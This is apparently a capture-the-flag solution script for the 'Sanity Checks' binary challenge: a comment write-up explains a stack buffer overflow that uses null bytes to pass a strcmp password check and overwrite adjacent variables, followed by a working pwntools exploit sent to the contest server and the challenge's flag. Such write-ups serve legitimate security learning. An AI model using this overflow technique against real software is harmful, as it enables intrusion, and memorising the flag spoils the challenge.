#!/usr/bin/env python3

################################ Write-Up #####################################
# Challenge: Sanity Checks
# Caetgory: Binary
# Points: 80
# Description: I made a program (source) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at /problems/2021/sanity_checks on the shell server, or connect with nc shell.actf.co 21303.
# Author: kmh
# Hint: gdb may be helpful for analyzing how data is laid out in memory.
#
# Basic bof, but you have to override variable values. According to the source
# code u need to make the value in the password buffer "password123", but the
# question arises: how can make a string that is equal to that and still have
# more bytes after that? Well, you can do it by using null bytes to fill the
# password buffer since strcmp ends comparisons after a null byte is reached.
# The rest of the exploit, as hinted, was made by looking into GDB and finding
# the offesets of the variables on the stack respective to rbp.
#
# Flag: actf{if_you_aint_bout_flags_then_i_dont_mess_with_yall}
# Solved by: Ryan Nguyen
###############################################################################

from pwn import *

exe = ELF("checks")

context.binary = exe


def conn():
	if False:
		return process([exe.path])
	else:
		return remote("shell.actf.co", 21303)


def main():
	r = conn()
	#gdb.attach(r, '''b strcmp''')
	r.recvuntil("word:")
	r.sendline("password123" + "\x00"*65 + "\x11\x00\x00\x00\x3d\x00\x00\x00\xf5\x00\x00\x00\x37\x00\x00\x00\x32\x00\x00\x00")
	r.interactive()


if __name__ == "__main__":
	main()
